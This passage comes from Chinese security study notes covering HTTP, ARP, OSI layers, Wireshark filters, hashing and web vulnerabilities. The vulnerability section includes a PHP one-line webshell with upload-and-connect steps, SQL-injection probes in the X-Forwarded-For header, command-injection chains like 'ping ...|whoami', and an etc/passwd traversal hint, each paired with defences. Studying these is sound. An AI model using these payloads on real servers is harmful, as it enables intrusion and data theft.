class="headerlink" title="HTTP有什么特点？"></a><strong>HTTP有什么特点？</strong></h3><ol><li><p><strong>简单和灵活</strong>：</p><ul><li>HTTP协议使用简单的请求-响应模型，通信过程直观明了。它支持各种数据格式和内容类型，使得可以在网络上传输各种类型的数据。</li></ul></li><li><p><strong>无连接和无状态</strong>：</p><ul><li>HTTP协议是无连接的，即每次请求都是独立的，服务器不会保持与客户端的连接状态。同时，HTTP是无状态的，服务器不会保存请求之间的状态信息，每个请求都是独立的，这使得HTTP协议具有简单性和可伸缩性，但同时需要通过其他机制（如Cookie、Session）来管理用户状态。</li></ul></li><li><p><strong>基于文本</strong>：</p><ul><li>HTTP协议的请求和响应都是基于文本的，使用ASCII字符进行通信，这使得HTTP消息可以被直接查看和调试。</li></ul></li><li><p><strong>支持客户端-服务器模式</strong>：</p><ul><li>HTTP协议基于客户端-服务器模式，客户端发送请求，服务器返回响应。这种模式灵活且符合互联网应用的需求。</li></ul></li><li><p><strong>支持缓存机制</strong>：</p><ul><li>HTTP协议支持缓存机制，可以通过缓存技术减少网络传输，提高性能和用户体验。</li></ul></li><li><p><strong>扩展性</strong>：</p><ul><li>HTTP协议具有良好的扩展性，支持通过标头（Header）字段传递各种自定义信息，可以实现更复杂的功能和应用。</li></ul></li></ol><h3 id="HTTP有什么作用？"><a href="#HTTP有什么作用？" class="headerlink" title="HTTP有什么作用？"></a><strong>HTTP有什么作用？</strong></h3><ol><li><p><strong>传输网页和超文本内容</strong>：</p><ul><li>HTTP协议最基本的作用是传输网页和超文本内容。通过HTTP，浏览器可以向服务器请求网页，服务器则返回包含HTML、CSS、JavaScript等内容的响应，完成页面的展示和渲染。</li></ul></li><li><p><strong>传输各种类型的数据</strong>：</p><ul><li>除了网页，HTTP还可以传输各种类型的数据，如图像、音频、视频、文件等。HTTP支持多种内容类型和数据格式，使得互联网上的资源能够以统一的方式进行访问和传输。</li></ul></li><li><p><strong>实现客户端和服务器之间的通信</strong>：</p><ul><li>HTTP作为客户端和服务器之间的通信协议，使得客户端能够向服务器发送请求并接收响应。这种通信模式支持了各种互联网应用的实现，如浏览器访问网页、移动应用与服务器通信等。</li></ul></li><li><p><strong>支持Web应用的交互</strong>：</p><ul><li>HTTP协议支持通过请求和响应实现Web应用的交互功能，如用户登录、数据提交、状态管理等。</li></ul></li></ol><p>在网络通信中，请求头（Request Header）和响应头（Response Header）是HTTP协议中的重要部分，用于在客户端和服务器之间传递关于请求或响应的元数据信息。下面是它们的作用和常见字段的含义：</p><h3 id="请求头（Request-Header）"><a href="#请求头（Request-Header）" class="headerlink" title="请求头（Request Header）"></a>请求头（Request Header）</h3><p>请求头包含了客户端向服务器发送的请求的附加信息，这些信息描述了请求本身的性质、格式、认证信息等。常见的请求头字段包括：</p><ol><li><p><strong>User-Agent</strong></p><ul><li>含义：标识了发起请求的用户代理（通常是浏览器或应用程序）的相关信息，如操作系统、浏览器类型和版本号等。</li></ul></li><li><p><strong>Host</strong></p><ul><li>含义：指定被请求资源的主机名和端口号。</li></ul></li><li><p><strong>Accept</strong></p><ul><li>含义：指定客户端可接受的内容类型，用于服务器返回合适的响应。</li></ul></li><li><p><strong>Content-Type</strong></p><ul><li>含义：指定请求体的MIME类型，告诉服务器请求中的内容格式是什么样的。</li></ul></li><li><p><strong>Authorization</strong></p><ul><li>含义：包含用于对请求进行身份验证的凭据，通常用于发送身份验证信息（如基本认证或令牌）。</li></ul></li></ol><h3 id="响应头（Response-Header）"><a href="#响应头（Response-Header）" class="headerlink" title="响应头（Response Header）"></a>响应头（Response Header）</h3><p>响应头包含了服务器对客户端请求的响应的元数据信息，用于描述响应的属性、类型、缓存设置等。常见的响应头字段包括：</p><ol><li><p><strong>Content-Type</strong></p><ul><li>含义：指定响应体的MIME类型，告诉客户端响应的内容格式是什么样的。</li></ul></li><li><p><strong>Content-Length</strong></p><ul><li>含义：指定响应体的长度，以字节为单位。</li></ul></li><li><p><strong>Cache-Control</strong></p><ul><li>含义：控制缓存的行为，例如是否缓存响应、缓存的有效期等。</li></ul></li><li><p><strong>Set-Cookie</strong></p><ul><li>含义：在响应中设置Cookie，将会在客户端保存，用于跟踪会话状态或其他状态信息。</li></ul></li><li><p><strong>Location</strong></p><ul><li>含义：用于重定向，指示客户端应该跳转到的新位置。</li></ul></li></ol><h3 id="其他常见字段"><a href="#其他常见字段" class="headerlink" title="其他常见字段"></a>其他常见字段</h3><p>除了上述字段外，还有许多其他常见的请求头和响应头字段，用于控制和描述HTTP请求和响应的各个方面。例如：</p><ul><li><strong>Date</strong>：指定消息创建的日期和时间。</li><li><strong>Server</strong>：指示服务器的软件信息。</li><li><strong>ETag</strong>：用于缓存验证，表示资源的标识符。</li><li><strong>Referer</strong>：指示请求的来源页面 URL。</li><li><strong>Connection</strong>：控制连接的选项，如保持长连接或关闭连接等。</li></ul><p>这些请求头和响应头字段的合理设置和使用，能够有效地控制HTTP请求和响应的行为，提高通信的效率和安全性。</p><h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><p>ARP协议的核心作用是在局域网内解析IP地址到MAC地址的映射关系，帮助设备确定数据包的接收方，从而实现有效的网络通信。</p><h2 id="DNS协议-端口号53"><a href="#DNS协议-端口号53" class="headerlink" title="DNS协议 &#x2F; 端口号53"></a>DNS协议 &#x2F; 端口号53</h2><p><strong>域名解析协议（DNS，Domain Name System）的用途是将域名和 IP 地址相互映射</strong></p><h1 id="二、漏洞相关"><a href="#二、漏洞相关" class="headerlink" title="二、漏洞相关"></a>二、漏洞相关</h1><p>讲讲漏洞的 <strong>成因 攻击方式&#x2F;类型 预防方式</strong></p><h2 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h2><p><strong>产生原因</strong><br>本质上是程序员没有遵循代码与数据分离原则 使用户数据作为代码执行</p><blockquote><p>当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p></blockquote><p><strong>攻击方式&#x2F;类型</strong><br>类型有 字符型或者数字型</p><ol><li>get注入<br>在get传参时写入参数，将SQl语句闭合，后面加写入自己的SQL语句。</li><li>post注入<br>通过post传参，原理与get一样，重要的是判断我们所输入的信息是否与数据库产生交互，其次判断SQL语句是如何闭合的。</li><li>有些网站通过查询cookie判断用户是否登录，需要与数据库进行交互，我们可以修改cookie的值，查找我们所需要的东西。或者通过报错注入是网页返回报错信息。</li><li>Referer注入<br>Referer正确写法应该是Referrer,因为http规定时写错只能将错就错，有些网站会记录ip和访问路径，例如百度就是通过Referer来统计网站流量，我们将访问路径进行SQL注入，同样也可以得到想要的信息。</li><li>XFF注入<br>在用户登录注册模块在 HTTP 头信息添加 X-Forwarded-for: 9.9.9.9’ ，用户在注册的时候，如果存在安全隐 患，会出现错误页面或者报错。从而导致注册或者登录用户失败。<br>burpsuite 抓包，提交输入检测语句：</li></ol><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-for: 127.0.0.1&#x27;and 1=1#</span><br><span class="line">X-Forwarded-for: 127.0.0.1&#x27;and 1=2#</span><br><span class="line">//两次提交返回不一样，存在 SQL 注入漏洞</span><br></pre></td></tr></table></figure><ol start="6"><li>UA注入：输入点在User-Agent</li></ol><p><strong>sql语句相关</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">show databases; //显示数据库列表</span><br><span class="line">SELECT \* FROM users; //检索数据</span><br><span class="line">insert into; //向数据表中插入新记录</span><br><span class="line">update; //更新表中记录</span><br><span class="line">delete from; //用于从数据表中删除数据</span><br><span class="line">create table; //创建新的数据库</span><br><span class="line">sum() //计算某列的总和</span><br><span class="line">count() //计算指定列的行数</span><br><span class="line">avg() min() max() abs() //平均值 最小值 最大值 绝对值</span><br><span class="line">TRUNCATE //清空某个表的数据</span><br><span class="line">drop //直接把表删了</span><br></pre></td></tr></table></figure><p><strong>如何预防</strong><br>为了防止 SQL 注入攻击，可以采取以下几种防御方式：</p><ol><li><strong>使用参数化查询（Prepared Statements）</strong>：<ul><li>使用参数化查询是最有效的防御 SQL 注入的方法之一。参数化查询使用占位符（如 <code>?</code>）代替直接将用户输入嵌入到 SQL 查询中，然后将参数与查询分离，确保用户输入不会被当作 SQL 代码执行。</li></ul></li><li><strong>输入验证与过滤</strong>：<ul><li>对于用户输入的数据，进行严格的输入验证和过滤，只接受预期的数据格式和范围。例如，对于数字输入，确保只包含数字字符；对于字符串输入，可以使用白名单过滤非法字符。</li><li>在应用程序的前端和后端都进行输入验证，防止恶意输入进入系统。</li></ul></li><li><strong>最小权限原则（Least Privilege Principle）</strong>：<ul><li>遵循最小权限原则，为数据库用户分配最小必要的权限。应用程序连接数据库时，使用有限权限的数据库账号，避免使用具有过高权限的账号。</li></ul></li><li><strong>避免拼接 SQL 语句</strong>：<ul><li>避免将用户输入直接拼接到 SQL 查询语句中。即使对于动态构建的查询，也应该使用参数化查询或者安全的 ORM（对象关系映射）工具，而不是手动拼接字符串。</li></ul></li><li><strong>ORM 框架的使用</strong>：<ul><li>使用 ORM 框架（如Hibernate、Entity Framework等）可以帮助自动化地处理数据库访问和数据映射，减少手动编写 SQL 查询的机会，从而降低 SQL 注入的风险。</li></ul></li><li><strong>安全编码实践</strong>：<ul><li>培训开发人员和测试人员，提高他们对安全编码的认识，编写安全的代码和进行安全审计。</li><li>定期更新和维护应用程序和数据库系统，及时修复已知的安全漏洞。</li></ul></li><li><strong>监控与日志记录</strong>：<ul><li>实施安全监控和日志记录机制，及时发现和响应潜在的 SQL 注入攻击行为。</li></ul></li><li><strong>安全审计</strong>：<ul><li>定期进行安全审计和漏洞扫描，及时发现并修复存在的安全问题。</li></ul></li></ol><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p><strong>漏洞成因</strong></p><blockquote><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p></blockquote><p><strong>攻击方式&#x2F;类型</strong><br>主要在于一句话木马的组成方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($\_POST[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line">↑这就是最简单的一句话木马</span><br><span class="line">其中的$\_POST可以替换为$\_GET或者$\_REQUEST</span><br><span class="line">分别代表POST传参 GET传参 两者皆可</span><br><span class="line">eval是命令执行函数</span><br><span class="line">其余的分别有：</span><br><span class="line">eval()：将字符串作为 PHP 代码执行。</span><br><span class="line">system()：执行系统命令并返回输出。</span><br><span class="line">exec()：执行外部命令。</span><br><span class="line">shell\_exec()：执行 shell 命令并返回输出。</span><br><span class="line">passthru()：执行外部命令并将原始输出发送到输出。</span><br><span class="line">popen()：打开进程文件指针。</span><br><span class="line">proc\_open()：执行命令并打开进程文件指针。</span><br></pre></td></tr></table></figure><p>随后把包含该内容的php文件上传至服务器 利用中国菜刀 蚁剑等软件连接即可</p><p><strong>防御方式</strong><br>检查文件类型 检查文件大小 传文件后更改文件名称 对文件内容进行检查与过滤</p><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p><strong>漏洞成因</strong><br>和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。</p><p>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含。</p><p>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p><p>以PHP为例,常用的文件包含函数有以下四种<br>include(),require(),include_once(),require_once()</p><p>区别如下:</p><p><strong>require():找不到被包含的文件会产生致命错误，并停止脚本运行</strong><br><strong>include():找不到被包含的文件只会产生警告，脚本继续执行</strong><br><strong>require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</strong><br><strong>include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</strong></p><p><strong>攻击方式&#x2F;类型</strong><br>分为 <strong>本地文件包含漏洞</strong> 与 <strong>远程文件包含漏洞</strong><br><strong>本地文件包含</strong>的话 可以利用绝对路径来获取账号信息 又或者读取服务器文件<br>在传参中加入若干个..&#x2F;与etc&#x2F;passwd来看账号信息</p><p>如果PHP的配置选项<code>allow_url_include</code>、<code>allow_url_fopen</code>状态为ON的话，则<strong>include&#x2F;require</strong>函数是可以加载远程文件的，这种漏洞被称为<strong>远程文件包含</strong><br>这样的话可以下载远程网站的脚本 联合csrf攻击 或者执行远程代码</p><p><strong>如何防御</strong><br>本地：<strong>输入验证和过滤</strong> 限制用户访问范围 使用白名单机制限制允许包含的文件或目录列表 只允许应用程序包含受信任的文件<br>远程：关闭<code>allow_url_include</code>、<code>allow_url_fopen</code>等配置</p><h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><p><strong>漏洞成因</strong></p><blockquote><p>命令执行漏洞是指服务器没有对执行的命令进行过滤，用户可以随意执行系统命令，命令执行漏洞属于高危漏洞之一<br>如PHP的命令执行漏洞主要是基于一些函数的参数过滤不足导致，可以执行命令的函数有system( )、exec( )、shell_exec( )、passthru( )、pcntl_execl( )、popen( )、proc_open( )等，当攻击者可以控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击<br>PHP执行命令是继承WebServer用户的权限，这个用户一般都有权限向Web目录写文件，可见该漏洞的危害性相当大</p></blockquote><p>假使有一个ping ip的网站 而输入框没有屏蔽; || | &amp;&amp; &amp;等管道符 导致了恶意代码的运行 这就是命令执行漏洞</p><p><strong>攻击方式&#x2F;类型</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">管道符的区别</span><br><span class="line">WINDOWS系统支持的管道符</span><br><span class="line">“|”：直接执行后面的语句</span><br><span class="line">例如：ping www.baidu.com|whoami</span><br><span class="line">“||”：如果前面执行的语句执行出错，则执行后面的语句</span><br><span class="line">例如：ping www.baidu.com||whoami</span><br><span class="line">“&amp;”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假</span><br><span class="line">例如：ping www.baidu.com&amp;whoami或者ping www.baidu.com&amp;whoami</span><br><span class="line">“&amp;&amp;”：如果前面的语句为真先执行第一个命令后执行第二个命令；为假则直接出错，也不执行后面的语句</span><br><span class="line">例如：ping www.baidu.com&amp;&amp;whoam</span><br><span class="line">LINUX系统支持的管道符</span><br><span class="line">“；”执行完前面的命令执行后面的</span><br><span class="line">“|”：显示后面语句的执行结果</span><br><span class="line">“||”：当前面的语句执行出错时，执行后面的语句</span><br><span class="line">“&amp;”：如果前面的语句为假，则直接指向后面的语句，前面的语句可真可假</span><br><span class="line">“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句</span><br></pre></td></tr></table></figure><p>一般与linux命令 <strong>find</strong> 一同执行<br>find 目录(一般为&#x2F; 根目录) -name(限制条件为名称) ‘flag.txt’<br><strong>如何防御</strong><br>过滤管道符 使用白名单机制对输入内容进行限制</p><h2 id="XSS-CSRF漏洞"><a href="#XSS-CSRF漏洞" class="headerlink" title="XSS&amp;CSRF漏洞"></a>XSS&amp;CSRF漏洞</h2><p><strong>漏洞成因</strong><br>XSS：未对输入框中的内容进行严格过滤 导致恶意用户能够在网页中注入恶意的脚本代码 这些恶意脚本在被其他用户访问时会在其浏览器中执行 从而达到攻击的目的<br>CSRF：应用程序没有对用户的请求进行有效的验证和授权，攻击者可以伪装用户身份向应用程序发送恶意请求，利用用户在应用程序中的登录状态或会话。</p><h3 id="攻击类型-方式："><a href="#攻击类型-方式：" class="headerlink" title="攻击类型&#x2F;方式："></a><strong>攻击类型&#x2F;方式：</strong></h3><p>XSS漏洞</p><ol><li><strong>存储型 XSS</strong>：攻击者将恶意脚本存储到服务器上的数据库或文件中，当其他用户访问包含恶意脚本的页面时，恶意脚本被从服务器检索并执行。</li><li><strong>反射型 XSS</strong>：攻击者将恶意脚本作为参数包含在URL中，当用户点击包含恶意参数的链接时，恶意脚本会从URL中反射到用户的浏览器中执行。</li></ol><p>CSRF漏洞</p><ol><li><strong>基于表单的CSRF</strong>：攻击者诱使用户在已经登录的情况下访问包含恶意表单的页面，当用户提交表单时，实际上是提交了恶意请求。</li><li><strong>基于图片的CSRF</strong>：攻击者将恶意请求隐藏在图片URL中，当用户加载包含恶意图片的页面时，实际上是触发了恶意请求。</li><li><strong>基于链接的CSRF</strong>：攻击者诱使用户点击包含恶意请求的链接，以触发恶意操作。</li></ol><p><strong>防御方式</strong><br>XSS：输入验证&#x2F;转义 使用安全的http标头<br>CSRF：验证用户来源 生成随机验证token</p><h1 id="三、网络相关"><a href="#三、网络相关" class="headerlink" title="三、网络相关"></a>三、网络相关</h1><p><strong>Wireshark是一款用于监听网络的软件</strong></p><ul><li><p>wireshark有三个面板：</p><ul><li>packet list面板</li><li>packet details面板</li><li>packet bytes面板</li></ul><p><img src="12.png" alt="12"></p><p>这三个面板之间是相互关联的：</p><p>如果希望在packet details面板中查看一个单独的数据包的具体内容，必须在packet list面板中单机选中那个数据包<br>选中该数据包之后，才可以通过在packet deatils面板中选择数据宝的某个字段进行分析，从而在packet bytes面板中查看相应字段的字节信息</p><h2 id="packet-list"><a href="#packet-list" class="headerlink" title="packet list"></a>packet list</h2><p>packet list面板：以表格的形式显示了当前捕获文件中的所有数据报，从下面可以看出，一共有7列：</p><p>No（Number列）：包的编号<br>默认wireshark是按照数据包编号从低到高排序<br>该编号不会发生改变，即使使用了过滤也同样如此<br>Time列：包的时间戳。时间格式可以自己设置<br>Source列和Destination列：包的源地址和目的地址<br>Protocol列：包的协议类型<br>Length列：包的长度<br>Info列：包的附加信息</p><p><img src="13.png" alt="13"></p><h2 id="packet-details"><a href="#packet-details" class="headerlink" title="packet details"></a>packet details</h2><p>packet details面板：分层的显示了一个数据包中的内容，并且可以通过展开或者收缩来显示这个数据包中所捕获的全部内容<br><img src="14.png" alt="14"><br>默认数据详细信息都是合并的，如果要查看，可以单击每行前面的箭头：<br><img src="15.png" alt="15"></p><h2 id="packet-bytes"><a href="#packet-bytes" class="headerlink" title="packet bytes"></a>packet bytes</h2><p>packet bytes面板：</p><ul><li>显示了一个数据包未经处理的原始样子，也就是它在链路上传播时的样子。</li><li>在该面板中的数据是以16进制和ASCII格式显示了帧的内容</li><li>当在packet details面板中选择任意一个字段后，在packet bytes面板中包含该字段的字节也高亮显示。</li></ul><p><img src="16.png" alt="16"></p></li></ul><h3 id="1-协议过滤器"><a href="#1-协议过滤器" class="headerlink" title="1. 协议过滤器"></a>1. 协议过滤器</h3><ul><li><strong>过滤特定协议</strong>：<ul><li><code>http</code>：显示所有HTTP协议的数据包。</li><li><code>tcp</code>：显示所有TCP协议的数据包。</li><li><code>udp</code>：显示所有UDP协议的数据包。</li><li><code>icmp</code>：显示所有ICMP协议的数据包。</li></ul></li></ul><h3 id="2-IP地址和端口过滤器"><a href="#2-IP地址和端口过滤器" class="headerlink" title="2. IP地址和端口过滤器"></a>2. IP地址和端口过滤器</h3><ul><li><strong>过滤源或目标IP地址</strong>：<ul><li><code>ip.addr == 192.168.1.100</code>：显示源或目标IP地址为192.168.1.100的数据包。</li></ul></li><li><strong>过滤源或目标端口</strong>：<ul><li><code>tcp.port == 80</code>：显示目标或源端口为80的TCP数据包。</li><li><code>udp.port == 53</code>：显示目标或源端口为53的UDP数据包。</li></ul></li></ul><h3 id="3-数据包方向和流量类型过滤器"><a href="#3-数据包方向和流量类型过滤器" class="headerlink" title="3. 数据包方向和流量类型过滤器"></a>3. 数据包方向和流量类型过滤器</h3><ul><li><strong>过滤数据包方向</strong>：<ul><li><code>src host 192.168.1.100</code>：显示源IP地址为192.168.1.100的数据包。</li><li><code>dst host 192.168.1.100</code>：显示目标IP地址为192.168.1.100的数据包。</li><li><code>src net 192.168.1.0/24</code>：显示源IP地址属于192.168.1.0&#x2F;24子网的数据包。</li></ul></li><li><strong>过滤流量类型</strong>：<ul><li><code>tcp.flags.syn == 1</code>：显示带有TCP SYN标志的数据包（用于TCP连接建立）。</li><li><code>tcp.flags.ack == 1</code>：显示带有TCP ACK标志的数据包（用于确认）。</li></ul></li></ul><h3 id="4-组合过滤器"><a href="#4-组合过滤器" class="headerlink" title="4. 组合过滤器"></a>4. 组合过滤器</h3><ul><li><strong>组合多个条件</strong>：<ul><li><code>ip.addr == 192.168.1.100 &amp;&amp; tcp.port == 80</code>：显示源或目标IP地址为192.168.1.100且目标或源端口为80的数据包。</li><li><code>tcp.flags.syn == 1 &amp;&amp; ip.addr == 192.168.1.100</code>：显示源或目标IP地址为192.168.1.100且带有TCP SYN标志的数据包。</li></ul></li></ul><h3 id="5-其他过滤器"><a href="#5-其他过滤器" class="headerlink" title="5. 其他过滤器"></a>5. 其他过滤器</h3><ul><li><strong>过滤特定协议的字段</strong>：<ul><li><code>http.request.method == &quot;GET&quot;</code>：显示所有HTTP GET请求的数据包。</li><li><code>http.response.code == 200</code>：显示所有HTTP响应码为200的数据包。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最新的知识点</title>
      <link href="/2024/04/28/%E6%9C%80%E6%96%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2024/04/28/%E6%9C%80%E6%96%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<p>考试可能会用到 谁又知道呢</p><h1 id="一、osi模型"><a href="#一、osi模型" class="headerlink" title="一、osi模型"></a>一、osi模型</h1><p>维基百科定义：</p><blockquote><p>“OSI模型，即开放式通信系统互联参考模型（Open System Interconnection Reference Model），是国际标准化组织（ISO）提出的一个试图使各种计算机在世界范围内互连为网络的标准框架，简称OSI。”</p></blockquote><p>定义了网络互连的七层模型（物理层、数据链路层、网络层、传输层、会话层、表示层、应用层）</p><h2 id="这七层分别有什么用-对应什么协议"><a href="#这七层分别有什么用-对应什么协议" class="headerlink" title="这七层分别有什么用&#x2F;对应什么协议"></a><strong>这七层分别有什么用&#x2F;对应什么协议</strong></h2><p>应用层：为应用程序或用户请求提供各种请求服务。OSI参考模型最高层，也是最靠近用户的一层，为计算机用户、各种应用程序以及网络提供接口，也为用户直接提供各种网络服务。</p><p>表示层：数据编码、格式转换、数据加密。提供各种用于应用层数据的编码和转换功能,确保一个系统的应用层发送的数据能被另一个系统的应用层识别。如果必要，该层可提供一种标准表示形式，用于将计算机内部的多种数据格式转换成通信中采用的标准表示形式。数据压缩和加密也是表示层可提供的转换功能之一。</p><p>会话层：创建、管理和维护会话。接收来自传输层的数据，负责建立、管理和终止表示层实体之间的通信会话，支持它们之间的数据交换。该层的通信由不同设备中的应用程序之间的服务请求和响应组成。</p><p>传输层：数据通信。建立主机端到端的链接，为会话层和网络层提供端到端可靠的和透明的数据传输服务，确保数据能完整的传输到网络层。</p><p>网络层：IP选址及路由选择。通过路由选择算法，为报文或通信子网选择最适当的路径。控制数据链路层与传输层之间的信息转发，建立、维持和终止网络的连接。数据链路层的数据在这一层被转换为数据包，然后通过路径选择、分段组合、顺序、进&#x2F;出路由等控制，将信息从一个网络设备传送到另一个网络设备。</p><p>数据链路层：提供介质访问和链路管理。接收来自物理层的位流形式的数据，封装成帧，传送到网络层；将网络层的数据帧，拆装为位流形式的数据转发到物理层；负责建立和管理节点间的链路，通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。</p><p>物理层：管理通信设备和网络媒体之间的互联互通。传输介质为数据链路层提供物理连接，实现比特流的透明传输。实现相邻计算机节点之间比特流的透明传送，屏蔽具体传输介质和物理设备的差异。</p><p><img src="blob.jpg" alt="blob"></p><h1 id="二、wireshark（主要是面板和筛选器）"><a href="#二、wireshark（主要是面板和筛选器）" class="headerlink" title="二、wireshark（主要是面板和筛选器）"></a>二、wireshark（主要是面板和筛选器）</h1><h2 id="首先讲面板"><a href="#首先讲面板" class="headerlink" title="首先讲面板"></a>首先讲面板</h2><p>wireshark有三个面板：</p><ul><li>packet list面板</li><li>packet details面板</li><li>packet bytes面板</li></ul><p><img src="12.png" alt="12"></p><p>这三个面板之间是相互关联的：</p><p>如果希望在packet details面板中查看一个单独的数据包的具体内容，必须在packet list面板中单机选中那个数据包<br>选中该数据包之后，才可以通过在packet deatils面板中选择数据宝的某个字段进行分析，从而在packet bytes面板中查看相应字段的字节信息</p><h2 id="packet-list"><a href="#packet-list" class="headerlink" title="packet list"></a>packet list</h2><p>packet list面板：以表格的形式显示了当前捕获文件中的所有数据报，从下面可以看出，一共有7列：</p><p>No（Number列）：包的编号<br>默认wireshark是按照数据包编号从低到高排序<br>该编号不会发生改变，即使使用了过滤也同样如此<br>Time列：包的时间戳。时间格式可以自己设置<br>Source列和Destination列：包的源地址和目的地址<br>Protocol列：包的协议类型<br>Length列：包的长度<br>Info列：包的附加信息</p><p><img src="13.png" alt="13"></p><h2 id="packet-details"><a href="#packet-details" class="headerlink" title="packet details"></a>packet details</h2><p>packet details面板：分层的显示了一个数据包中的内容，并且可以通过展开或者收缩来显示这个数据包中所捕获的全部内容<br><img src="14.png" alt="14"><br>默认数据详细信息都是合并的，如果要查看，可以单击每行前面的箭头：<br><img src="15.png" alt="15"></p><h2 id="packet-bytes"><a href="#packet-bytes" class="headerlink" title="packet bytes"></a>packet bytes</h2><p>packet bytes面板：</p><ul><li>显示了一个数据包未经处理的原始样子，也就是它在链路上传播时的样子。</li><li>在该面板中的数据是以16进制和ASCII格式显示了帧的内容</li><li>当在packet details面板中选择任意一个字段后，在packet bytes面板中包含该字段的字节也高亮显示。</li></ul><p><img src="16.png" alt="16"></p><h1 id="三、ARP协议"><a href="#三、ARP协议" class="headerlink" title="三、ARP协议"></a>三、ARP协议</h1><h3 id="什么是ARP"><a href="#什么是ARP" class="headerlink" title="什么是ARP"></a><strong>什么是ARP</strong></h3><p>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。地址解析协议是建立在网络中各个主机互相信任的基础上的，局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；</p><p>最直白的说法是：在IP以太网中，当一个上层协议要发包时，有了该节点的IP地址，ARP就能提供该节点的MAC地址。</p><p>大家都知道，OSI模式把网络工作分为七层，彼此不直接打交道，只通过接口(layre interface). IP地址在第三层（网络层）, MAC地址在第二层（数据链路层）。协议在发送数据包时，首先要封装第三层（IP地址）和第二层 （MAC地址）的报头, 但协议只知道目的节点的IP地址，不知道其物理地址，又不能跨第二、三层，所以得用ARP的服务拿到MAC地址。</p><h1 id="四、哈希函数"><a href="#四、哈希函数" class="headerlink" title="四、哈希函数"></a>四、哈希函数</h1><p>哈希函数（Hash Function）是一种将任意长度的数据映射到固定长度输出的算法。哈希函数常用于加密、数字签名、数据完整性验证、数据压缩等领域。</p><p>哈希函数具有以下几个特点：</p><ol><li><strong>固定输出长度</strong>：哈希函数的输出长度固定，不论输入数据的长度如何，输出长度都是固定的。</li><li><strong>单向性</strong>：哈希函数是一种单向函数，即无法从哈希值推算出原始数据。<em>这是哈希函数应用于密码学的一个关键特性。</em></li><li><strong>确定性</strong>：对于相同的输入数据，哈希函数总是会生成相同的输出值。</li><li><strong>雪崩效应</strong>：哈希函数的输入数据只要发生了微小的变化，输出值就会发生巨大的变化，这种效应被称为雪崩效应。</li></ol><p>哈希函数广泛应用于密码学中，通常用于保护数据的机密性和完整性。例如，常用的密码存储方法是将用户密码经过哈希函数处理后存储在数据库中，当用户登录时，输入的密码会被哈希函数处理后与数据库中的哈希值进行比较，从而验证密码的正确性。</p><h1 id="五、对称-非对称数据加密"><a href="#五、对称-非对称数据加密" class="headerlink" 